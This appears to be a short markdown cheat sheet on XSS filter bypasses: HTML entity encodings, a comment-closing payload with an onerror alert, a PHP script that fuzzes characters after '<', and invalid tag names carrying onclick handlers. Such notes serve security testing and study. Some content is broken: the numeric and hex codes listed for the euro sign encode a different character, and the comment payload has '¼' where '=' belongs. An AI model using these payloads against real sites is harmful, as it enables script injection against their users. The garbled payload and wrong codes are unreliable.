## Html Entities

__€ character__
```
&euro;        ---       Entitiy Name
&#164;        ---       numerical entity
&#xA4         ---       hexadecimal representation
&#8364;       ---       Decimal Form
&#x20ac;      ---       hexadecimal form.
```
_Note that decimal entities are introduced by an __ampersand (&) and a hash mark (#)__, whereas hexadecimal HTML entities are introduced by __an ampersand, a hash mark, and an x__._

#### Comments
```
A<!--><img src¼"x" onerror¼"alert(1)">-->B        ---         Comments can be closed with > also
```


## Fuzzing

Let's Fuzz Using the fallowing Code
```php

<?php
for($i=0; $i <= 255; $i++) {
$character=chr($i);
# Right after the opening <
echo '<div><'.$character.'a href="http://www.google.com/">'.$i.'</a></div>';
}
?>
```

### ! and ?
Place `!` and `?` at the beginning < of tag makes the tag comment automatically.

> <!img src=x> will be treated as comment
> <?img src=x> will be treated as comment


#### Invalida Tag names

invalid tag names can be used for XSS filter bypass if blacklists are used

```html
<Lm onclick=alert(1)>click me</Lm>
<xx onclick=alert(0)>ClickMe</xx>
```


